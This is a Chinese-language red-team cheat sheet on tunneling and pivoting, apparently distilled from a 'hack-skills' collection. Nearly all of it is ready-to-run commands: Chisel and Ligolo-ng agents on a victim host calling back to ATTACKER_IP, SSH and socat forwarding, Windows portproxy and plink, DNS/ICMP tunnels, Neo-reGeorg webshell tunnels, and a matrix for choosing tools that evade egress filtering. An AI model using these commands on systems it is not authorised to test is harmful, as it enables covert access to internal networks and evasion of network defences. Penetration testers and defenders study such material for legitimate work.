# 隧道与横向代理 (Tunneling & Pivoting)

> 来源提炼: yaklang/hack-skills (tunneling-and-pivoting)
> 覆盖 SSH 转发、Chisel、Ligolo-ng、socat、DNS/ICMP/HTTP 隧道、ProxyChains、Windows 横向、多层链式

## SSH 隧道

```bash
# 本地转发: 访问 INTERNAL_HOST:3306 经 localhost:3306
ssh -L 3306:INTERNAL_HOST:3306 user@PIVOT -N
# 远程转发: 暴露本机 8000 到 pivot 网络
ssh -R 9000:127.0.0.1:8000 user@PIVOT -N
# 动态 SOCKS
ssh -D 1080 user@PIVOT -N
# 跳板
ssh -J jump1,jump2 user@TARGET
```

## Chisel (反向 SOCKS 最常用)

```bash
# 攻击端
chisel server --reverse --port 8080
# 受害端
chisel client ATTACKER_IP:8080 R:socks
# 端口转发
chisel client ATTACKER:8080 R:3306:INTERNAL_DB:3306
```

## Ligolo-ng (透明 TUN 路由)

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# agent: ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert
# 控制台: session → ifconfig → start
sudo ip route add 10.10.10.0/24 dev ligolo
# 双层: 每个 agent 一组路由
```

## socat

```bash
socat TCP-LISTEN:8080,fork TCP:INTERNAL:80      # TCP 转发
socat UDP-LISTEN:53,fork UDP:INTERNAL_DNS:53    # UDP 中继
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:INTERNAL:80
```

## ProxyChains

```ini
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

```bash
proxychains nmap -sT -Pn -p 22,80,445 10.10.10.0/24
```

## Windows 横向

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_IP
plink.exe -ssh -D 1080 -N user@ATTACKER
```

## DNS / ICMP / HTTP 隧道

```bash
# DNS: iodine
iodined -f -c -P password 10.0.0.1 t1.yourdomain.com
iodine -f -P password t1.yourdomain.com
# dnscat2 (ruby dnscat2.rb / ./dnscat --dns=server=ATTACKER,port=53)
# ICMP: icmpsh / ptunnel-ng (TCP-over-ICMP)
# HTTP: Neo-reGeorg 生成 webshell → SOCKS
python3 neoreg.py generate -k PASSWORD
python3 neoreg.py -k PASSWORD -u http://TARGET/tunnel.php
```

## 出站选择矩阵

| 出站能力 | 工具 | 备注 |
|---------|------|------|
| TCP 任意端口 | Chisel / Ligolo-ng / SSH | 最快 |
| 仅 TCP 80/443 | Chisel(HTTP/S) / Neo-reGeorg | 混入 web 流量 |
| 仅 DNS(53/udp) | iodine / dnscat2 | 慢但隐蔽 |
| 仅 ICMP | ptunnel-ng / icmpsh | 极受限环境 |
| 无出站 | bind shell + 端口转发 | 需入站 |
| 仅 webshell | Neo-reGeorg / Tunna | 仅 HTTP 上传可用 |